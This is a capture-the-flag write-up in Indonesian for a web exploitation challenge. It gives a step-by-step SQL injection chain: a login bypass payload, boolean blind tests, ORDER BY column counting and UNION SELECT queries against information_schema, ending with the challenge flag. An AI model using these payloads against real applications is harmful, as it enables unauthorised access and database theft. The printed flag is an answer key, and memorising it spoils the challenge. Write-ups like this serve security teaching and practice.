# WEB EXPLOITATION

## Author

Nikoo

## Categories

Web Exploitation

## Description

Flag format: `LKS{...}`

## Attachment

- `http://54.151.244.93:8100/`

## Solver

### Step 1: Login bypass lewat Authentication SQL Injection

Buka halaman login di `http://54.151.244.93:8100/login.php`. Form login ini mengirimkan `username` dan `password` langsung ke query SQL tanpa sanitasi, jadi bisa dimanipulasi lewat payload klasik:

```
Username: admin' or '1'='1'-- -
Password: (bebas, misal: x)
```

**Hasil:** Login berhasil tanpa perlu tahu password asli, karena payload membuat kondisi `WHERE username='admin' or '1'='1'-- -...'` selalu bernilai `TRUE`. Peserta masuk ke halaman `dashboard.php` sebagai user pertama di tabel.

---

### Step 2: Temukan parameter rentan di fitur pencarian

Dari dashboard, buka fitur **Katalog Produk** (`http://54.151.244.93:8100/search.php?id=1`). Parameter `id` di URL juga dimasukkan langsung ke query tanpa sanitasi. Uji dengan **boolean-based blind SQL Injection**:

```
?id=1 AND 1=1-- -   -> produk muncul
?id=1 AND 1=2-- -   -> "Produk tidak ditemukan"
```

**Hasil:** Perbedaan respons di atas membuktikan input `id` langsung memengaruhi query SQL yang dijalankan di server — titik ini rentan terhadap SQL Injection.

---

### Step 3: Cari jumlah kolom dengan `ORDER BY`

Sebelum melakukan UNION-based injection, jumlah kolom pada query asli harus diketahui dulu:

```
?id=-1 ORDER BY 1-- -   -> aman
?id=-1 ORDER BY 2-- -   -> aman
?id=-1 ORDER BY 3-- -   -> error (Unknown column '3' in 'order clause')
```

**Hasil:** Query asli hanya mengembalikan **2 kolom**, jadi payload `UNION SELECT` selanjutnya harus menyertakan tepat 2 kolom.

---

### Step 4: Enumerasi nama tabel lewat `information_schema`

Gunakan UNION-based SQL Injection untuk query langsung ke metadata database (`information_schema`), supaya nama tabel tidak perlu ditebak:

```
?id=-1 UNION SELECT table_name, 2 FROM information_schema.tables WHERE table_schema=database()-- -
```

**Hasil:** Muncul daftar tabel yang ada di database, termasuk satu tabel yang tidak pernah ditampilkan di alur aplikasi normal — `config`.

---

### Step 5: Enumerasi kolom pada tabel `config`

```
?id=-1 UNION SELECT column_name, 2 FROM information_schema.columns WHERE table_name='config'-- -
```

**Hasil:** Tabel `config` memiliki dua kolom: `id` dan `flag`.

---

### Step 6: Ambil flag

```
?id=-1 UNION SELECT flag, 2 FROM config-- -
```

**Flag**
```
LKS{b4e8c21f9a7d6035e2f6b8c1d94a7053}
```
